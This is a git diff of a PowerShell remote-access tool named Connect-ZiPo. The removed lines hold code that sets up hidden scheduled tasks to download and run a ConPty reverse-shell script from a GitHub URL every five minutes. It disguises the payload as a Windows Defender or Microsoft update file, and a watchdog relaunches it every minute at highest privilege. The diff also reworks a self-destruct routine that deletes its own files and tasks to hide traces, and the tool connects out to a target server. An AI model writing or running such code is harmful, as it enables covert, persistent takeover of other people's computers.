@@ -379,63 +379,6 @@ function PortSuggest {
     }
 }
 
-function Register-UpdateTask {
-    $taskName = "ZiPo_UpdateCheck"
-    $scriptBlock = @"
-\$url = 'https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1'
-\$path = '$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1'
-
-try {
-    \$remote = Invoke-WebRequest -Uri \$url -UseBasicParsing
-    \$remoteHash = (\$remote.Content | Get-FileHash -Algorithm SHA256).Hash
-    if (Test-Path \$path) {
-        \$localHash = (Get-FileHash -Path \$path -Algorithm SHA256).Hash
-    } else {
-        \$localHash = ''
-    }
-
-    if (\$remoteHash -ne \$localHash) {
-        \$remote.Content | Out-File -Encoding UTF8 -FilePath \$path
-        Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
-    }
-} catch {}
-"@
-
-    $tempFile = "$env:TEMP\updatecheck.ps1"
-    $scriptBlock | Out-File $tempFile -Encoding UTF8
-
-    schtasks /Create /TN $taskName /SC MINUTE /MO 5 /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempFile`"" /F /RL HIGHEST | Out-Null
-}
-
-
-function Register-SelfWatchTask {
-    $taskName = "ZiPo_SelfWatch"
-    $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
-
-    $watchScript = @"
-Add-Content -Path `"$env:APPDATA\WindowsDefender\watchdog.log`" -Value "`"[*] Watchdog run: \$(Get-Date)`"
-
-\$path = `"$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1`"
-\$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
-
-if (-not \$running) {
-    Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
-}
-"@
-
-    # Сохраняем скрипт в нужный путь
-    $watchScript | Set-Content -Path $watchScriptPath -Encoding UTF8 -Force
-
-    # Удаляем старую задачу
-    schtasks /Delete /TN $taskName /F > $null 2>&1
-
-    # Регистрируем задачу
-    schtasks /Create /TN $taskName /SC MINUTE /MO 1 `
-        /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchScriptPath`"" `
-        /RL HIGHEST /F | Out-Null
-}
-
-
 
 
 
@@ -638,38 +581,27 @@ function Update-Self {
 
     function Self-Destruct {
     try {
-        $basePath = "$env:APPDATA\WindowsDefender"
-        $scriptPath = Join-Path $basePath "MicrosoftUpdate.ps1"
-        $watchdogPath = Join-Path $basePath "watchdog.ps1"
-        $watchdogLog = Join-Path $basePath "watchdog.log"
-        $cleanupBat = Join-Path $basePath "cleanup.bat"
+        $scriptPath = $MyInvocation.MyCommand.Path
+        if (-not $scriptPath) {
+            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
+        }
 
-        $taskNames = @(
-            "MicrosoftEdgeUpdateChecker",
-            "ZiPo_UpdateCheck",
-            "ZiPo_SelfWatch",
-            "ZiPo_Cleanup"
-        )
+        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
+        $taskName = "MicrosoftEdgeUpdateChecker"
+        $cleanupTask = "ZiPo_Cleanup"
 
-        # Формируем тело .bat файла
         $batContent = @"
 @echo off
 timeout /t 5 >nul
-del "$scriptPath" /f /q >nul 2>&1
-del "$watchdogPath" /f /q >nul 2>&1
-del "$watchdogLog" /f /q >nul 2>&1
+del "$scriptPath" /f /q
+schtasks /Delete /TN "$taskName" /F >nul 2>&1
+del "%~f0" /f /q
+schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 "@
 
-        foreach ($tn in $taskNames) {
-            $batContent += "`nschtasks /Delete /TN `"$tn`" /F >nul 2>&1"
-        }
-
-        $batContent += "`ndel `%~f0 /f /q"
-
-        # Сохраняем и запускаем .bat файл
         $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        schtasks /Create /TN "ZiPo_Cleanup" /SC ONCE /TR "`"$cleanupBat`"" `
+        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
             /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
         Start-Sleep -Seconds 1
@@ -682,10 +614,7 @@ del "$watchdogLog" /f /q >nul 2>&1
 
 
 
-
-    Add-Persistence
-    Register-UpdateTask
-    Register-SelfWatchTask
+      Add-Persistence
     Output-Log "[*] Starting Connect-ZiPo..."
     Output-Log "[*] Target server: $srv"
     Output-Log "[*] Target port: $port"
@@ -713,7 +642,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            453                                                                                                                                                                   
+                                            LOG CON TEST                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
